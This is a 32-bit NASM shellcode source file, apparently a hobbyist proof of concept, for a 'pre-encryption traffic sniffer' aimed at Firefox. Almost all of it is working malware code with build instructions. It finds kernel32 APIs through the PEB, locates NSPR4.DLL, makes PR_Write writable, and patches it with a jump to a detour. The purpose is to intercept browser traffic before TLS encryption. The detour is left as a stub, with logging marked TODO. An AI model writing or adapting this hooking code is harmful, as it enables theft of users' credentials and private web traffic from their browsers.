; kirikou.asm by h4lf-jiffie (dohmatob elvis dopgima): FireFox pre-encryption traffic sniffer
; TODO XXX use API name hashes instead of strings (les opcodes seront plus discr�t et moins lourd!)
; BUG XXX: In rstore_PR_Write_memory_access_rights, VirtualProtect(..) screws with error 0x000003E6
; Hint: shouldn't we race condition here ? should we [the carrier-thread] no elevate our priority before doing such
;       'scary' stuff (BTW, this solution worked in inlinedetours.lib)

; 4CKNOWLEDGEMENT5:
; 0]-- http://www.projectshellcode.com
; 1]-- HARMONY SECURITY (http://blog.harmonysecurity.com/2009_06_01_archive.html)
; 2]-- http://www.infond.fr/2009/09/tutoriel-initiation-aux-shellcodes.html      
; 3]-- phr4ck Issue 0x3e by sk <sk at scan-associates d0t net>

; compile with 'nasm -f bin -o kirikou.bin kirikou.asm'
; Use some opcode wizard to extract the generated shellcode. I use PYHTON. Viz, shellcode = open('kirikou.bin', 'rb').read()
; You have the fire!

[SECTION .text]

; set the code to be 32-bit
; Tip: If you don't have this line in more complex shellcode,
;    the resulting instructions may end up being different to
;    what you were expecting.
BITS 32

global _start
    
_start:
    jmp entry_point
 
;crypto:
;    fldz
;    fnstenv [esp-0xC]
;    pop eax
;    add al, 10
;    nop
;    add eax,(entry_point - crypto - 0xA)    ; PROOF. It holds that @entry_point = @here + (@entry_point - @here)
;                                            ; && @entry_point - @here = (@entry_point - @crypto) - (@here - @crypto)
;                                            ; && @here = eax.  
;                                            ; But olldbg tells me: @here - @crypto = 10 bytes.
;                                            ; Thus, @entry_point = eax + (@entry_point - @crypto) - 0xA = 
;                                            ; eax + (@entry_point - J) - (@here - J) - 0xA, for all J.
;                                            ; Q.E.D.
;                                             
;    mov esi,eax                 ; esi = @entry_point
;    mov edi, esi
;    xor ecx,ecx
;    mov ecx,(zthe_end - entry_point) ; size of code to encode/decode
;    
;loop1:
;    lodsb 
;    xor 	al, 96h         ; 0x96 is the key
;    stosb
;    loop 	loop1
    
entry_point:
    xor eax,eax
    xor ebx,ebx 
    xor ecx,ecx
    xor esi,esi
    xor edi,edi
                                ; we've cleared the general purpose registers
    jmp get_kernel32
    
get_kernel32:
    mov edx, [fs:0x30]		; get a pointer to the PEB
    mov edx, [edx + 0x0C]	; get PEB->Ldr
    mov edx, [edx + 0x14]	; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov edx, [edx]		; get the next entry (2nd entry)
    mov edx, [edx]		; get the next entry (3rd entry)
    mov edx, [edx + 0x10]	; get the 3rd entries base address (kernel32.dll)
    
get_export_directory_table:
    mov ebx, [edx + 0x3c] ; ebx = offset of PE signature in kernel32.dll
    mov ebx, [edx + ebx + 0x78] ; ebx = offset of Export Directory Table in kernel32.dll
    add ebx,edx ; ebx = adress of Export Directory Table
    
get_GetProcAddress_address:
    mov ecx, [ebx+0x18] ; ecx = nb of exported APIs (counter)
    mov eax, [ebx+0x20] ; eax = offset of Export Name Pointer Table in kernel2.dll
    add eax,edx ; eax = address of Export Name Pointer Table
    
get_GetProcAddress_address_loop:
    dec ecx ; we'll index the APIs in reverse order; start from highest index
    jmp get_GetProcAddress_string 
    
get_GetProcAddress_string_return:
    pop edi ; edi = 'GetProcAddress'
    mov esi,[eax+ecx*4] ; esi = ordinal of 'APIName\n' in Name Pointer Table
    add esi,edx ; esi = adress of 'APIName\n' in Name Pointer Table
    push ecx ; store
    xor ecx,ecx
    add cl,14 ; ecx = length of "GetProcAddress" string
    repe cmpsb 
    pop ecx ; restore: ecx = nb exported APIs
    jnz get_GetProcAddress_address_loop
    mov eax, [ebx+0x24] ; eax = offset Ordinal Table in kernel32.dll
    add eax,edx ; eax = adresse Ordinal Table
    mov cx, [eax+ecx*2] ; cx = API ordinal - first ordinal
    mov ax,[ebx+0x10] ; eax = first ordinal in the table table
    add cx,ax ; cx = ordinal de la API
    dec cx ; to fall just in-phase (ordinal starts at 0)
    mov eax,[ebx+0x1c] ; eax = offset Export Address Table
    add eax,edx ; eax = adress of Export Address Table
    mov eax,[eax+ecx*4] ; eax = offset of GetProcAddress kernel32.dll
    add eax,edx 
    mov ebx, eax ; ebx = adresse GetProcAddress
    jmp get_stuff_to_load_from_kerne32
    
get_stuff_to_load_from_kerne32_return:
    pop 	esi		; esi now points to the NULL-seperated list/table of APIs we'll be loading from kernel32.dll
    mov 	edi,esi	        ; Assuming no API name is less than 4 bytes long (this is reasonable), we'll progressively 
				; override the said table with addresses of the the loaded APIs. BTW, we won't be 
				; needing the table in future!
    call	load_apis	; when this returns, edi points to table of API addresses
                                ; XXX Do error-checks here!
    jmp        get_address_of_nspr4dll_path

grab_nspr4dll_handle:
    ;int3
    ;int3
    pop		ecx 		; address of NSPR4.DLL path
    push 	ecx
    call 	[edi - 0xC]	; GetModuleHandleA(dll path address)
    ;int3
    ;int3
    jmp     after_grab_nspr4dll_handle
    
after_grab_nspr4dll_handle:
    mov         edx,eax
    ;int3
    jmp         get_stuff_to_hook_from_nspr4dll
    
get_stuff_to_hook_from_nspr4dll_return:
    jmp load_stuff_to_hook_from_nspr4

load_stuff_to_hook_from_nspr4: 
    pop 	esi		; esi now points to the NULL-seperated list/table of APIs we'll be loading from NSPR4.DLL
    ;int3
    push        edi             ; save: remeber, j ==> [eax - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the APIs
                                ; loaded from kernel32.dll
    mov 	edi,esi	        ; Assuming no API name is less than 4 bytes long (this is reasonable), we'll progressively 
				; override the said table with addresses of the the loaded APIs. BTW, we won't be 
				; needing the table in future!
    call	load_apis	; when this returns, edi points to table of API addresses
                                ; XXX Do error-checks here!
    mov         eax,edi         ; j ==> [eax - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the APIs we just
                                ; loaded from NSPR4.DLL. In the sequel, we'll try not to misplace this 'piece of info'.
    
    pop         edi             ; restore
    ;int3
    jmp         hook_stuff_from_nspr4
    
hook_stuff_from_nspr4:
    fldz
    fnstenv [esp-0xC]
    pop edx
    add dl, 10
    nop
    add edx,($PR_Write_detour - $hook_stuff_from_nspr4 - 0xA)
                                ; edx now contains (run-time) address of PR_Write_detour
                                ; and edx - 5 contains (run-time) address of PR_Write_detour_trampoline
    ;int3
    push        edi             ; save
    push        eax             ; save
    
set_offset_for_PR_Write_detour_trampoline:
    mov         edi, edx
    sub         edi,0x4
                                ; edi now contains address of "\xDE\xAD\xBE\xEF" string in PR_Write_detour_trampoline
    mov         ecx,[eax-4]     ; eax now contains address of PR_Write API
    add         ecx,0x6         ; <- 6 bytes ahead; untampered bytes of the API start here
    xor         eax,eax
    sub         ecx,edi
    add         ecx,0x1         ; weird correction!
    sub         ecx,0x5         ; 5-byte correction (size of jump instruction in PR_Write_detour_trampoline)
    mov         eax,ecx   
    stosd
    ;int3
    ;int3

after_set_offset_for_PR_Write_detour_trampoline:
    pop         eax             ; restore
    pop         edi             ; restore
    ;int3
    ;int3
    push        esi             ; save
    push        eax             ; save
    push        edx             ; save
    push        edi             ; save
    mov         eax,[eax-0x4]   ; eax now contains address of PR_Write
    ;int3
    
tweak_PR_Write_memory_access_rights:
    push        esi             ; would-be pointer to current access right (useful if we wish to restore it later)
    push        0x40            ; PAGE_EXECUTE_READWRITE
    push        0x6             ; size
    push        eax             ; address of PR_Write
    call        [edi - 0x14]    ; VirtualProtect(address of PR_Write, 0x6, PAGE_EXECUTE_READWRITE, esi)
    
after_tweak_PR_Write_memory_access_rights:
                                ; error-checks follow
    test        eax,eax
    pop         edi             ; restore
    pop         edx             ; restore
    pop         eax             ; restore
    pop         esi             ; restore
    jz          error           ; Oops! It's no good to continue!
    
install_PR_Write_detour:
    push        eax
    push        edi
    mov         edi,[eax - 4]   ; address of PR_Write
    xor         eax,eax         ; clear, we are parano
    mov         al, 0x90
    stosb                       ; write NOP to address of PR_Write
    ;int3
    mov         al, 0xE9
    stosb                       ; write \xE9 to address of PR_Write, + 1
    ;int3
    xor         eax,eax
    mov         eax,edx
    ;int3
    ;int3
    sub         eax,edi
    add         eax,0x1         ; <- weird correction!
    sub         eax,0x5         ; correction for jmp instruction itself
                                ; now eax = address of PR_Write_detour - (address of PR_Write + 1) - 5
    stosd                       ; write eax to address of PR_Write + 2
                                ; the patch is now 90 E9 DEADBEEF
                                
after_install_PR_Write_detour:
    ;int3
    pop         edi             ; restore
    pop         eax             ; restore
    ;int3
                                
restore_PR_Write_memory_access_rights:
    push        esi             ; save
    push        eax             ; save
    push        edx             ; save
    push        edi             ; save
    mov         eax,[eax-0x4]   ; eax now contains address of PR_Write
    mov         edx,[esi]       ; edx now contains previous PR_Write memory access rights
    push        esi             
    push        edx
    push        0x6             ; size
    push        eax             ; address of PR_Write
    call        [edi - 0x14]    ; VirtualProtect(address of PR_Write, 0x6, previous protection, esi)
    pop         edi             ; restore
    pop         edx             ; restore
    pop         eax             ; restore
    pop         esi             ; restore
    push        eax             ; save
    push        edi             ; save  
    jmp quit

PR_Write_detour_trampoline:
    db 0xE9
                                ; The following double-word will be corrected according by
                                ; set_offset_for_PR_Write_detour_trampoline
    db 0xDE
    db 0xAD
    db 0xBE
    db 0xEF
    
PR_Write_detour:
    nop                         ; This is just a stub. We own outgoing pre-encryption firefox traffic!
                                ; XXX TODO: As P-O-C, log traffic to file
    
PR_Write_patched_bytes:
    MOV         EAX,[ESP+4]
    MOV         ECX,[EAX]
    
resume_PR_Write:
    jmp         PR_Write_detour_trampoline 
    
load_apis:
    nop				; @description: loads a bunch of APIs from a DLL
				; Here, I expect:
				; 1]-- edx set to the address of the DLL from which we'll load the APIs
				; 2]-- esi pointing to the NULL-seperated list/table of to-be-loaded APIs
				; 3]-- ebx set to the address of GetProcAddress
    
load_next_api:
    lodsb
    test	al,al
    jnz         load_next_api

check_end_of_API_table:
    lodsb
    dec		esi 		; fix-up
    test	al,al
    jz 		load_apis_end	

continue_load_nex_api:
    push	ebx  		; save
    push 	edx		; save
    push	esi  
    push	edx  		; DLL address
    call	ebx  		; GetProcAddress(DLL address, API_Name);
    ;int3			; uncomment this INT3 and inspect eax in a debugger (ollydbg?) if u will
    pop edx			; restore 
    pop	ebx			; restore   
    stosd			; write the output to EDI
    jmp		load_next_api	;

load_apis_end:
    ret				; j ==> [edi - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the loaded APIs
    
error:
    call        [edi - 0x18]    ; GetLastError()
    int3
    int3
    nop				; this is just a stub

quit:
    push 	0x0
    call	[edi - 4]	; ExitThread(0x0)	
    
get_GetProcAddress_string:
    call        get_GetProcAddress_string_return
				; the above call will push the address of the NULL-terminated "GetProcAddress" string, 
				; and then jump to the get_stuff_to_load_from_kerne32_return label
    db 'GetProcAddress'
    db 0x0
    
get_stuff_to_load_from_kerne32:
    call        get_stuff_to_load_from_kerne32_return
            			; The above call will push the address of the following table, and then jump to the
				; get_stuff_to_load_from_kerne32_return label.
    db 0x0 			; <- marks beginning of next table entry
                                ; <- add other API (NULL-seperated!) names here if you wll
    db "GetLastError"
    db 0x0
    db "VirtualProtect"
    db 0x0
    db "FreeLibraryAndExitThread"
    db 0x0
    db "GetModuleHandleA"
    db 0x0
    db "LoadLibraryA"
    db 0x0
    db "ExitThread"
    db 0x0
    db 0x0 ; <- marks end of this table 
    
get_address_of_nspr4dll_path:
    call        grab_nspr4dll_handle
    db "NSPR4.DLL"
    db 0x0
    
get_stuff_to_hook_from_nspr4dll:
    call        get_stuff_to_hook_from_nspr4dll_return
    db 0x0                      ; marks start of table entry
    db "PR_Write"
    db 0x0
    db 0x0                      ; marks end of table
    
zthe_end:

; (c) h4lf-jiffie (gmdopp@gmail.com)




